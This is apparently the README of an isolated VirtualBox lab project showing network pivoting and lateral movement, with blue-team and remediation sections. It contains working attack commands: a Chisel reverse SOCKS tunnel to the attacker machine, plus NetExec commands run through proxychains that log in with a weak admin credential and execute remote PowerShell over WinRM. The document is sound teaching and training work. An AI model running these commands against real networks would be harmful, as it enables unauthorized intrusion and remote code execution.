# Network Pivoting & Lateral Movement Lab

A hands-on, fully **isolated** cybersecurity lab built from scratch on VirtualBox that demonstrates the complete **network pivoting → lateral movement** kill chain — and the blue-team view of it.

> ⚠️ **Ethics & scope:** Every machine is self-owned and runs on isolated VirtualBox *Internal Networks* with **no connection to any home network or the internet** during testing. All credentials are throwaway lab values. Nothing external is ever touched. This is for learning and interview demonstration only.

---

## The one-sentence story

An attacker who **cannot even route** to the internal network compromises an internal Windows host — by tunneling through one dual-homed "pivot" server and abusing a weak admin credential.

```
KALI-ATTACKER ──[DMZ-NET 172.16.10.0/24]── PIVOT01 ──[INTERNAL-NET 10.0.0.0/24]── WIN-TARGET01
  172.16.10.5                          .15 / 10.0.0.15                             10.0.0.25
       └─────────── no direct route to 10.0.0.0/24 ── tunnels through the pivot ──────────┘
```

---

## What's in this repo

| Folder | Contents |
|---|---|
| `architecture/` | Network topology & attack-flow diagrams |
| `configurations/` | VM builder script, netplan/firewall configs |
| `screenshots/` | 9 proof screenshots of every stage |
| `reports/` | Full pentest report (MD + JSON), LinkedIn write-up |
| `troubleshooting/` | Feasibility report, ISO guide, gotchas log |
| `scripts/` | Python automation framework *(in progress)* |

---

## The kill chain (all proven — see `screenshots/`)

1. **Segmentation verified** — attacker & target are mutually unreachable; only the pivot bridges them. `[01,02,03]`
2. **Reverse SOCKS tunnel** (Chisel) — pivot dials back to the attacker, exposing a SOCKS5 proxy on Kali `127.0.0.1:1080`. `[04,05]`
3. **Reach the internal net** via proxychains through the tunnel. `[06]`
4. **Expose + enumerate** the Windows target's SMB/WinRM through the tunnel. `[08]`
5. **Lateral movement** — authenticate as weak admin `labadmin` → `(Pwn3d!)`. `[07]`
6. **Remote code execution** over WinRM — run PowerShell on the internal box. `[09]`

### Key commands
```bash
# Kali (attacker) — tunnel server
chisel server -p 8080 --reverse

# PIVOT01 — tunnel client (reverse SOCKS)
chisel client 172.16.10.5:8080 R:socks

# Kali — attack through the tunnel
proxychains4 -f pc.conf nxc smb   10.0.0.25 -u labadmin -p 'Lab@12345' --shares
proxychains4 -f pc.conf nxc winrm 10.0.0.25 -u labadmin -p 'Lab@12345' -X 'whoami; hostname'
```

---

## Hard-won lessons (the real learning)

- **Internal Networks** give free, enforced isolation — no firewall rule needed to keep the lab off the home network.
- **ICMP ≠ reachability** — Windows Firewall drops ping by default; and ICMP doesn't traverse SOCKS at all.
- **nmap through SOCKS lies** — its parallel connect-scan reports everything "filtered"; use `nc` single connects.
- **WMI/DCOM won't tunnel** — it negotiates dynamic high ports; use **WinRM (single port 5985)** through a pivot.
- **TTL fingerprinting** — 64 = Linux, 128 = Windows, visible in ping replies.
- **Defender flags Chisel** as a hacktool — a real IOC for the blue team.
- **Infra pain is the lesson** — UEFI/TPM for Win11, graphics adapters for EFI display, eval-license shutdowns, VBS forcing slow Hyper-V mode. Building it (and fixing it) teaches far more than any walkthrough.

---

## Status — all 15 phases complete ✅

| Phase | Deliverable |
|---|---|
| 1 Host inspection | `troubleshooting/phase1-feasibility-report.md` |
| 2 Architecture | 3 VMs built · `configurations/create-lab-vms.ps1` |
| 3 Networks + isolation | **proven** · `architecture/network-topology.md` · screenshots 01–03 |
| 4 Initial access | pivot SSH foothold · `scripts/initial_access_check.py` |
| 5 Chisel tunnel | **proven** · `scripts/chisel_*.sh` · screenshots 04–05 |
| 6 Proxychains | **proven** · screenshot 06 |
| 7 Internal enumeration | **proven** · `scripts/internal_scan.py`, `smb_enum.py` · screenshot 08 |
| 8 Lateral movement | **`Pwn3d!` + RCE** · `scripts/lateral_movement_lab.py` · screenshots 07, 09 |
| 9 Advanced pivoting | `attack-scenarios/advanced-pivoting.md` (SSH -L/-R/-D, multi-hop) |
| 10 Packet analysis | **live capture** · `packet-captures/packet-analysis.md` · screenshot 10 |
| 11 Blue-team detection | `detection/blue-team-detection-guide.md` + audit setup |
| 12 Remediation | `remediation/remediation-plan.md` + hardening checklist |
| 13 Automation | 13 scripts in `scripts/` (safety-guarded, verified) |
| 14 Reporting | `reports/penetration-test-report.md` + `.json` |
| 15 Teaching | explanations throughout every doc |

See `reports/penetration-test-report.md` for the full write-up and
`architecture/attack-flow.md` for the end-to-end diagram.
